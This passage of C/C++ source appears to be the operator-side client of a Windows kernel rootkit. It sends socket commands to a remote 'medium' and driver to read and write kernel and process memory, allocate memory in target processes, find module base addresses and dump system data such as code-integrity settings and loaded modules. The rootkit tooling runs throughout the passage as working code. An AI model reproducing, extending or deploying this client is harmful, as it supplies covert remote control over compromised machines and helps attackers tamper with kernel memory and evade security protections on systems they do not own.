		GetBufferValue((PVOID)((ULONG64)Sysint.Reserved1 + 8), &unslong, sizeof(unslong));  printf("  DPC rate ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Sysint.Reserved1 + 12), &unslong, sizeof(unslong));  printf("  Time increment of interrupts ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Sysint.Reserved1 + 16), &unslong, sizeof(unslong));  printf("  Total amount of DPC bypasses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Sysint.Reserved1 + 20), &unslong, sizeof(unslong)); printf("  Total amount of APC bypasses ULONG -> %u\n", unslong);
		IntOffs += sizeof(SYSTEM_INTERRUPT_INFORMATION);
		memcpy(&Sysint, (PVOID)((ULONG64)IntInf + IntOffs), sizeof(SYSTEM_INTERRUPT_INFORMATION));
	}
}


// Print exceptions info of target -
void PrintExceptionInfo(PVOID ExcInf, ULONG64 EntrySize) {
	ULONG unslong = 0;
	SYSTEM_EXCEPTION_INFORMATION* ExInfo = (SYSTEM_EXCEPTION_INFORMATION*)ExcInf;

	printf("Exceptions Data on target:\n");
	GetBufferValue(ExInfo->Reserved1, &unslong, sizeof(unslong));  printf("  Total amount of allignment fixups ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)ExInfo->Reserved1 + 4), &unslong, sizeof(unslong));  printf("  Total amount of exception dispatches ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)ExInfo->Reserved1 + 8), &unslong, sizeof(unslong));  printf("  Total amount of floating emulations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)ExInfo->Reserved1 + 12), &unslong, sizeof(unslong));  printf("  Total amount of byteword emulations ULONG -> %u\n", unslong);
}


// Print system modules info of target -
void PrintModulesInfo(PVOID MdlInf, ULONG64 EntrySize) {
	ULONG unslong = 0;
	ULONG MdlOffs = 0;
	PVOID ModuleArr = (PVOID)((ULONG64)MdlInf + 4);
	RTL_PROCESS_MODULE_INFORMATION CurrMdl;
	memcpy(&CurrMdl, (PVOID)((ULONG64)ModuleArr + MdlOffs), sizeof(RTL_PROCESS_MODULE_INFORMATION));
	GetBufferValue(MdlInf, &unslong, sizeof(unslong));  printf("Information on system modules on target (number of system modules = %u):\n", unslong);
	for (ULONG m = 0; m < unslong; m++) {
		printf("System module number %u (name = %s) -\n", m, CurrMdl.FullPathName);
		printf("  Section data PVOID -> %llu\n", (ULONG_PTR)CurrMdl.Section);
		printf("  Mapped Base address (actual base in memory, loader) PVOID -> %llu\n", (ULONG_PTR)CurrMdl.MappedBase);
		printf("  Image base address (preferred base in memory, linker) PVOID -> %llu\n", (ULONG_PTR)CurrMdl.ImageBase);
		printf("  Size of image ULONG -> %u\n", CurrMdl.ImageSize);
		printf("  Module flags ULONG -> %u\n", CurrMdl.Flags);
		printf("  Index in loading order (when the module is loaded into memory) USHORT -> %hu\n", CurrMdl.LoadOrderIndex);
		printf("  Index in initialization order (when the module's DriverEntry is called after booting the target machine) USHORT -> %hu\n", CurrMdl.InitOrderIndex);
		printf("  Offset (distance in bytes) of FullPathName from the beginning of the structure USHORT -> %hu\n", CurrMdl.OffsetToFileName);
		printf("  Load count (how much times is the module refernced/loaded by the process running the driver) USHORT -> %hu\n", CurrMdl.LoadCount);

		MdlOffs += sizeof(RTL_PROCESS_MODULE_INFORMATION);
		memcpy(&CurrMdl, (PVOID)((ULONG64)ModuleArr + MdlOffs), sizeof(RTL_PROCESS_MODULE_INFORMATION));
	}
}


// Print system lookaside info of target -
void PrintLookasideInfo(PVOID LookasdInfo, ULONG64 EntrySize) {
	ULONG LookasdOffs = 0;
	ULONG unslong = 0;
	USHORT unsshort = 0;
	SYSTEM_LOOKASIDE_INFORMATION Currlook;
	memcpy(&Currlook, (PVOID)((ULONG64)LookasdInfo + LookasdOffs), sizeof(SYSTEM_LOOKASIDE_INFORMATION));
	PVOID Currlist = &Currlook.Reserved1;

	printf("Information on system lookaside data on target:\n");

	for (int l = 0; l < EntrySize / sizeof(SYSTEM_LOOKASIDE_INFORMATION); l++) {
		printf("List in index %u -\n", l);
		GetBufferValue(Currlist, &unsshort, sizeof(unsshort));  printf("  Current depth USHORT -> %hu\n", unsshort);
		GetBufferValue((PVOID)((ULONG64)Currlist + 2), &unsshort, sizeof(unsshort));  printf("  Maximum depth USHORT -> %hu\n", unsshort);
		GetBufferValue((PVOID)((ULONG64)Currlist + 4), &unslong, sizeof(unslong));  printf("  Total amount of allocate operations ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Currlist + 8), &unslong, sizeof(unslong));  printf("  Total amount of allocate misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Currlist + 12), &unslong, sizeof(unslong));  printf("  Total amount of free operations ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Currlist + 16), &unslong, sizeof(unslong));  printf("  Total amount of misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Currlist + 20), &unslong, sizeof(unslong));  printf("  List type ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Currlist + 24), &unslong, sizeof(unslong));  printf("  List tag ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Currlist + 28), &unslong, sizeof(unslong));  printf("  List size ULONG -> %u\n", unslong);

		LookasdOffs += sizeof(SYSTEM_LOOKASIDE_INFORMATION);
		memcpy(&Currlook, (PVOID)((ULONG64)LookasdInfo + LookasdOffs), sizeof(SYSTEM_LOOKASIDE_INFORMATION));
		Currlist = &Currlook.Reserved1;
	}
}


// Print system code integrity info of target -
void PrintCodeIntgrInfo(PVOID CodeintgrInfo, ULONG64 EntrySize) {
	ULONG unslong = 0;
	SYSTEM_CODEINTEGRITY_INFORMATION* CodeInf = (SYSTEM_CODEINTEGRITY_INFORMATION*)CodeintgrInfo;
	printf("Information on system code integrity on target:\n");
	printf("  Length of output ULONG -> %u\n", CodeInf->Length);
	printf("  Code integrity options ULONG -> %u ", CodeInf->CodeIntegrityOptions);
	switch (CodeInf->CodeIntegrityOptions) {
	case 1: printf("(CODEINTEGRITY_OPTION_ENABLED)\n"); break;
	case 2: printf("(CODEINTEGRITY_OPTION_TESTSIGN)\n"); break;
	case 4: printf("(CODEINTEGRITY_OPTION_UMCI_ENABLED)\n"); break;
	case 8: printf("(CODEINTEGRITY_OPTION_UMCI_AUDITMODE_ENABLED)\n"); break;
	case 16: printf("(CODEINTEGRITY_OPTION_UMCI_EXCLUSIONPATHS_ENABLED)\n"); break;
	case 0x80: printf("(CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED)\n"); break;
	case 0x200: printf("(CODEINTEGRITY_OPTION_FLIGHTING_ENABLED)\n"); break;
	case 0x400: printf("(CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED)\n"); break;
	case 0x800: printf("(CODEINTEGRITY_OPTION_HVCI_KMCI_AUDITMODE_ENABLED)\n"); break;
	case 0x1000: printf("(CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED)\n"); break;
	default: printf("(CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED)\n"); break;
	}
}


// Print system policy info of target -
void PrintPolicyInfo(PVOID PolicyInfo, ULONG64 EntrySize) {
	SYSTEM_POLICY_INFORMATION Polinf;
	memcpy(&Polinf, PolicyInfo, sizeof(SYSTEM_POLICY_INFORMATION));

	printf("Information on system policy on target:\n");
	printf("  Policy input data PVOID -> %llu\n", (ULONG_PTR)Polinf.Reserved1[0]);
	printf("  Policy output data PVOID -> %llu\n", (ULONG_PTR)Polinf.Reserved1[1]);
	printf("  Policy input data size ULONG -> %u\n", Polinf.Reserved2[0]);
	printf("  Policy output data size ULONG -> %u\n", Polinf.Reserved2[1]);
	printf("  Policy version ULONG -> %u\n", Polinf.Reserved2[2]);
}


// General function for printing info -
void PrintSystemInformation(PVOID Response, char c, ULONG64 status, DWORD n, ULONG64 Size) {
	printf("\n");
	printf("=====System Data Number %u START=====", n);
	printf("\n");
	if (status == ROOTKSTATUS_SUCCESS) {
		switch (c) {
		case 'r':
			PrintRegistryData(Response, Size); break;

		case 'b':
			PrintBasicSystemInfo(Response, Size); break;

		case 'p':
			PrintSystemPerformanceInfo(Response, FALSE, Size); break;

		case 't':
			PrintTimeOfDayInfo(Response, Size); break;

		case 'c':
			PrintWorkingProcessesInfo(Response, Size); break;

		case 'P':
			PrintCpuPerformanceInfo(Response, Size); break;

		case 'i':
			PrintInterruptInfo(Response, Size); break;

		case 'e':
			PrintExceptionInfo(Response, Size); break;

		case 'm':
			PrintModulesInfo(Response, Size); break;
		}
	}
	printf("=====System Data Number %u END=====\n\n", n);
}



/*
========================================================================
PASSING THE MAIN STRUCT AND HANDLING DIFFERENT REQUESTS FOR THE ROOTKIT:
========================================================================
*/


// Pass the module name used for operation (string = const char *, passes the VA) -
BOOL PassString(SOCKET tosock, const char* String) {
	ULONG StringSize = (ULONG)strlen(String) + 1;
	char MallocConfirm = 0;

	PASS_DATA result = SendData(tosock, &StringSize, sizeof(StringSize), FALSE, 0);
	if (result.err || result.value != sizeof(StringSize)) {
		return FALSE;
	}

	result = RecvData(tosock, sizeof(MallocConfirm), &MallocConfirm, FALSE, 0);
	if (result.err || result.value != sizeof(MallocConfirm) || MallocConfirm == 0) {
		return FALSE;
	}

    result = SendData(tosock, (PVOID)String, StringSize, FALSE, 0);
	if (result.err || result.value != StringSize) {
		return FALSE;
	}

	return TRUE;
}


// Passing the main structure to the medium -
BOOL PassArgs(ROOTKIT_MEMORY* Rootinst, SOCKET tosock, BOOL Retrieve) {
	PASS_DATA result = SendData(tosock, Rootinst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return FALSE;
	}

	if (Retrieve) {
		result = RecvData(tosock, sizeof(ROOTKIT_MEMORY), Rootinst, FALSE, 0);
		if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
			return FALSE;
		}
	}
	return TRUE;
}


// Get module base address by name - 
PVOID GetModuleBaseRootkKMD(const char* ModuleName, SOCKET tosock) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	PASS_DATA OprStatus = { 0 };
	printf("=====GetModuleBaseAddress=====\n\n");
	RootkInstructions.Operation = RKOP_MDLBASE;

	if (!PassString(tosock, ModuleName)) {
		printf("LOG: Could not pass the module name (%s) to medium :(\n", ModuleName);
		printf("==============================\n\n");
		return NULL;
	}
	RootkInstructions.MdlName = ModuleName;

	BOOL Res = PassArgs(&RootkInstructions, tosock, TRUE);
	if (!Res) {
		printf("LOG: Could not get the base address of %s (passing/receiving errors) :(\n", ModuleName);
		printf("==============================\n\n");
		return NULL;
	}

	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(RootkInstructions.Unexpected);

	if (RootkInstructions.Out == NULL || RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Unexpected != successful) {
		printf("RESPONSE: Could not get the address of %s :(\n", ModuleName);
		printf("==============================\n\n");
		return NULL;
	}
	printf("RESPONSE: %s address base: %p :)\n", ModuleName, RootkInstructions.Out);
	printf("==============================\n\n");
	return RootkInstructions.Out;  // get module base address
}


// Display debug message from kernel mode - 
BOOL DisplayStringFromKMD(const char* Message, SOCKET tosock, const char* ModuleName, ROOTKIT_UNEXERR Err) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	RootkInstructions.Operation = RKOP_DSPSTR;
	char InitFail = 1;

	printf("\n=====DisplayStringFromKMD=====\n");

	if (Err != successful) {
		SendData(tosock, &InitFail, sizeof(InitFail), FALSE, 0);
		printf("LOG: Could not pass data to medium - INITIAL ERROR :(\n");
		printf("=========================\n\n");
		return FALSE;
	}

	if (!PassString(tosock, Message)) {
		printf("LOG: Could not pass the string to display in debug (%s) to medium :(\n", Message);
		printf("=========================\n\n");
		return FALSE;
	}
	RootkInstructions.MdlName = Message;

	BOOL Res = PassArgs(&RootkInstructions, tosock, TRUE);
	if (!Res) {
		printf("LOG: Display message string in debug failed (passing/receiving struct) :(\n");
		printf("=========================\n\n");
		return FALSE;
	}

	PrintUnexpected(RootkInstructions.Unexpected);

	if (RootkInstructions.Unexpected != successful) {
		printf("LOG: Display message string in debug failed (Unexpected error inside medium) :(\n");
		printf("=========================\n\n");
		return FALSE;
	}

	else {
		PrintStatusCode(RootkInstructions.StatusCode);
		printf("LOG: Printed to WinDbg the next string: %s :)\n", Message);
		printf("==============================\n\n");
		return TRUE;
	}
}


// Read from kernel memory - 
bool ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	printf("\n=====ReadFromRootkKMD=====\n");
	RootkInstructions.Operation = RKOP_READ;
	char InitFail = 1;

	if (Err != successful) {
		SendData(tosock, &InitFail, sizeof(InitFail), FALSE, 0);
		printf("LOG: Could not pass data to medium - INITIAL ERROR :(\n");
		printf("==========================\n\n");
		return FALSE;
	}

	if (!PassString(tosock, ModuleName)) {
		printf("LOG: Could not pass read-from module name (%s) to medium :(\n", ModuleName);
		printf("==========================\n\n");
		return FALSE;
	}
	RootkInstructions.MdlName = ModuleName;

	RootkInstructions.Size = BufferSize;
	RootkInstructions.Buffer = ReadAddress;
	RootkInstructions.Out = DstBuffer;

	BOOL Res = PassArgs(&RootkInstructions, tosock, FALSE);
	if (!Res) {
		printf("LOG: Read operation from address %p did not succeed (passing/receiving struct) :(\n", ReadAddress);
		printf("==========================\n\n");
		return FALSE;
	}

	PASS_DATA result = RecvData(tosock, (int)BufferSize, DstBuffer, FALSE, 0);
	if (result.err || result.value != BufferSize) {
		printf("LOG: Read operation from address %p did not succeed (passing/receiving struct/UNEXPECTED ERROR IN MEDIUM) :(\n", ReadAddress);
		printf("==========================\n\n");
		return FALSE;
	}

	result = RecvData(tosock, sizeof(ROOTKIT_MEMORY), &RootkInstructions, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		printf("LOG: Read operation from address %p did not succeed (receiving later struct) :(\n", ReadAddress);
		printf("==========================\n\n");
		return FALSE;
	}

	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(successful);
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Read operation from address %p did not succeed :(\n", ReadAddress);
		printf("==========================\n\n");
		return FALSE;;
	}

	if (ReadAddress != RootkInstructions.Buffer) {
		printf("LOG: Bending towards the allocation base of the source memory region changed the base address from the requested %p to %p\n", ReadAddress, RootkInstructions.Buffer);
	}

	printf("LOG: Reading from address %p concluded, can check the DstBuffer for values :)\n", ReadAddress);
	printf("Read value converted to char * - (%s)\n", (char*)DstBuffer);
	printf("==========================\n\n");
	return TRUE;
}


// Write into kernel memory - 
bool WriteToRootkKMD(PVOID WriteAddress, PVOID SrcBuffer, ULONG WriteSize, const char* ModuleName, const char* SemiMdl, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	PASS_DATA result;
	char ConfirmMalloc = 1;

	printf("\n=====WriteToRootkKMD=====\n");
	RootkInstructions.Operation = RKOP_WRITE;

	if (Err != successful) {
		SendData(tosock, &ConfirmMalloc, sizeof(ConfirmMalloc), FALSE, 0);
		printf("LOG: Could not pass data to medium - INITIAL ERROR :(\n");
		printf("==========================\n\n");
		return FALSE;
	}

	if (!PassString(tosock, SemiMdl)) {
		printf("LOG: Could not pass write-from module name (%s) to medium :(\n", SemiMdl);
		printf("==========================\n\n");
		return FALSE;
	}
	RootkInstructions.MdlName = SemiMdl;

	if (!PassString(tosock, ModuleName)) {
		printf("LOG: Could not pass write-to module name (%s) to medium :(\n", ModuleName);
		printf("==========================\n\n");
		return FALSE;
	}
	RootkInstructions.DstMdlName = ModuleName;

	RootkInstructions.Size = WriteSize;
	RootkInstructions.Out = WriteAddress; // Address = virtual address in destination process / kernel mode address / buffer
	RootkInstructions.Buffer = SrcBuffer;  // not really used as the buffer is useless on another computer
	RootkInstructions.Reserved = (PVOID)ZeroBits;

	BOOL Res = PassArgs(&RootkInstructions, tosock, FALSE);
	if (!Res) {
		printf("LOG: Writing into address %p did not work (passing/receiving error) :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}


	// If the writing source is user-supplied send the buffer -
	if (strcmp(SemiMdl, "regular") == 0) {
		result = SendData(tosock, SrcBuffer, WriteSize, FALSE, 0);
		if (result.err || result.value != WriteSize) {
			printf("LOG: Writing into address %p did not work (passing the regular buffer) :(\n", WriteAddress);
			printf("=========================\n\n");
			return FALSE;
		}
	}

	result = RecvData(tosock, sizeof(ROOTKIT_MEMORY), &RootkInstructions, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		printf("LOG: Writing into address %p did not work (passing/receiving error) :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}

	if (!Res) {
		printf("LOG: Writing into address %p did not work (passing/receiving error) :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}
	else {
		printf("LOG: Writing into address %p data passed to medium :)\n", WriteAddress);
	}


	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(RootkInstructions.Unexpected);
	if (WriteAddress != RootkInstructions.Out) {
		printf("LOG: Allocation and committing of the destination memory changed the base address from the requested %p to %p\n", WriteAddress, RootkInstructions.Out);
	}

	if (SrcBuffer != RootkInstructions.Buffer) {
		printf("LOG: Bending towards the allocation base of the source memory region changed the base address from the requested %p to %p\n", SrcBuffer, RootkInstructions.Buffer);
	}

	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Unexpected != successful) {
		printf("LOG: Writing into address %p did not work :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}

	printf("LOG: Writing into address %p concluded :)\n", WriteAddress);
	printf("=========================\n\n");
	return TRUE;
}


// Get system information data:

// Check for valid info type string - 
static BOOL ValidateInfoTypeString(const char* InfoType) {
	if (strlen(InfoType) > 5 || strlen(InfoType) == 0) {
		return FALSE;
	}

	std::string cppString("rbptcPiemCIL");
	for (int i = 0; InfoType[i] != '\0'; i++) {
		if (cppString.find(InfoType[i]) == std::string::npos) {
			return FALSE;
		}
	}
	return TRUE;
}


// Return a status for a certain letter - 
SYSTEM_INFORMATION_CLASS ReturnSystemInfo(char InfoType) {
	switch (InfoType) {
	case 'r':
		return SystemRegistryQuotaInformation;

	case 'b':
		return SystemBasicInformation;

	case 'p':
		return SystemPerformanceInformation;

	case 't':
		return SystemTimeOfDayInformation;

	case 'c':
		return SystemProcessInformation;

	case 'P':
		return SystemProcessorPerformanceInformation;

	case 'i':
		return SystemInterruptInformation;

	case 'e':
		return SystemExceptionInformation;

	case 'm':
		return SystemModuleInformation;

	case 'L':
		return SystemLookasideInformation;

	case 'I':
		return SystemCodeIntegrityInformation;

	case 'C':
		return SystemPolicyInformation;

	default:
		return (SYSTEM_INFORMATION_CLASS)9999;
	}
}


// Actual function to handle request -
BOOL GetSystemInfoRootkKMD(const char* InfoTypes, SOCKET tosock, ROOTKIT_MEMORY* RootkInstructions, const char* ModuleName) {
	ULONG64 SysInfSize = 0;
	ULONG64 SysBuffOfs = 0;
	char FailedUnex = 1;
	ULONG AttrBufferSize = (ULONG)(sizeof(RKSYSTEM_INFORMATION_CLASS) * strlen(InfoTypes));
	RKSYSTEM_INFORMATION_CLASS SysType;
	RootkInstructions->Operation = RKOP_SYSINFO;

	printf("\n=====GetSystemInformation=====\n");

	if (!ValidateInfoTypeString(InfoTypes)) {
		printf("ERROR: Invalid info request string :(\n");
		printf("==============================\n\n");
		SendData(tosock, &FailedUnex, sizeof(FailedUnex), FALSE, 0);
		return FALSE;
	}

	if (!PassString(tosock, InfoTypes)) {
		printf("ERROR: Could not pass info types string (%s) to medium :(\n", InfoTypes);
		printf("==============================\n\n");
		return FALSE;
	}
	RootkInstructions->MdlName = InfoTypes;

	PVOID AttrBuffer = malloc(AttrBufferSize);
	if (AttrBuffer == NULL) {
		printf("ERROR: Cannot allocate buffer for attributes initial :(\n");
		printf("==============================\n\n");
		SendData(tosock, &FailedUnex, sizeof(FailedUnex), FALSE, 0);
		return FALSE;
	}

	for (int i = 0; i < strlen(InfoTypes); i++) {
		SysType.InfoType = ReturnSystemInfo(InfoTypes[i]);
		SysType.ReturnStatus = (ROOTKIT_STATUS)(0x7F7F7F7F7F8F8F00 + i);
		SysType.InfoSize = 0;
		memcpy((PVOID)((ULONG64)AttrBuffer + (i * sizeof(RKSYSTEM_INFORMATION_CLASS))), &SysType, sizeof(SysType));
	}

	PASS_DATA result = SendData(tosock, &AttrBufferSize, sizeof(AttrBufferSize), FALSE, 0);
	if (result.err || result.value != sizeof(AttrBufferSize)) {
		printf("ERROR: Cannot send size of buffer of attributes initials :(\n");
		printf("==============================\n\n");
		free(AttrBuffer);
		return FALSE;
	}

	result = SendData(tosock, AttrBuffer, AttrBufferSize, FALSE, 0);
	if (result.err || result.value != AttrBufferSize) {
		printf("ERROR: Cannot send buffer of attributes initials :(\n");
		printf("==============================\n\n");
		free(AttrBuffer);
		return FALSE;
	}

	BOOL Res = PassArgs(RootkInstructions, tosock, TRUE);
	if (!Res) {
		printf("ERROR: Cannot pass parameters through socket :(\n");
		printf("==============================\n\n");
		free(AttrBuffer);
		return FALSE;
	}

	if (RootkInstructions->Unexpected != successful) {
		printf("Unexpected error has occurred on medium when trying to perform the operation to get system information:\n");
		PrintUnexpected(RootkInstructions->Unexpected);
		free(AttrBuffer);
		return FALSE;
	}

	result = RecvData(tosock, sizeof(SysInfSize), &SysInfSize, FALSE, 0);
	if (result.err || result.value != sizeof(SysInfSize)) {
		free(AttrBuffer);
		return FALSE;
	}

	PVOID SysDataBuffer = malloc(SysInfSize);
	if (SysDataBuffer == NULL) {
		free(AttrBuffer);
		return FALSE;
	}

	result = RecvData(tosock, (int)SysInfSize, SysDataBuffer, FALSE, 0);
	if (result.err || result.value != SysInfSize) {
		printf("Error in system info might have been because medium could not receive the size of the buffer\n");
		free(SysDataBuffer);
		free(AttrBuffer);
		return FALSE;
	}

	result = RecvData(tosock, AttrBufferSize, AttrBuffer, FALSE, 0);
	if (result.err || result.value != AttrBufferSize) {
		free(SysDataBuffer);
		free(AttrBuffer);
		return FALSE;
	}


	// Parse data -

	printf("\n--------------------\nKERNEL DATA PARSE OF SYSTEM INFORMATION:\n--------------------\n");

	for (ULONG i = 0; i < strlen(InfoTypes); i++) {
		printf("Info number %u:\n", i + 1);
		memcpy(&SysType, (PVOID)((ULONG64)AttrBuffer + (i * sizeof(RKSYSTEM_INFORMATION_CLASS))), sizeof(SysType));

		if (SysType.InfoSize == 0) {
			printf("No available info\n");
		}
		else {
			PrintStatusCode(SysType.ReturnStatus);
			if (SysType.ReturnStatus == ROOTKSTATUS_SUCCESS) {
				PrintSystemInformation((PVOID)((ULONG64)SysDataBuffer + SysBuffOfs), InfoTypes[i], SysType.ReturnStatus, i + 1, (ULONG64)SysType.InfoSize);
			}
			SysBuffOfs += SysType.InfoSize;
		}
	}
	free(SysDataBuffer);
	free(AttrBuffer);

	printf("\n");
	printf("==============================\n\n");
	return TRUE;
}


// Specifically allocate memory in certain process - 
PVOID SpecAllocRootkKMD(PVOID AllocAddress, ULONG64 AllocSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	printf("\n=====SpecAllocRootkKMD=====\n");
	RootkInstructions.Operation = RKOP_PRCMALLOC;
	char InitFail = 1;

	if (Err != successful) {
		SendData(tosock, &InitFail, sizeof(InitFail), FALSE, 0);
		printf("LOG: Could not pass data to medium - INITIAL ERROR :(\n");
		printf("\n===========================\n");
		return NULL;
	}

	if (!PassString(tosock, ModuleName)) {
		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
		printf("\n===========================\n");
		return NULL;
	}

	RootkInstructions.MdlName = ModuleName;
	RootkInstructions.Size = AllocSize;
	RootkInstructions.Buffer = AllocAddress;
	RootkInstructions.Reserved = (PVOID)ZeroBits;

	BOOL Res = PassArgs(&RootkInstructions, tosock, TRUE);
	if (!Res) {
		printf("LOG: Allocation operation for address %p did not succeed (passing/receiving struct) :(\n", AllocAddress);
		printf("\n===========================\n");
		return NULL;
	}
	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(successful);

	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Allocation operation for address %p did not succeed :(\n", AllocAddress);
		printf("\n===========================\n");
		return NULL;
	}

	if (RootkInstructions.Out != RootkInstructions.Buffer) {
		printf("LOG: Alignment of the source memory region changed the base address from the requested %p to %p\n", RootkInstructions.Buffer, RootkInstructions.Out);
	}

	printf("SUCCESS: Allocation for address %p concluded :)\n", RootkInstructions.Out);
	printf("\n===========================\n");
	return RootkInstructions.Out;
}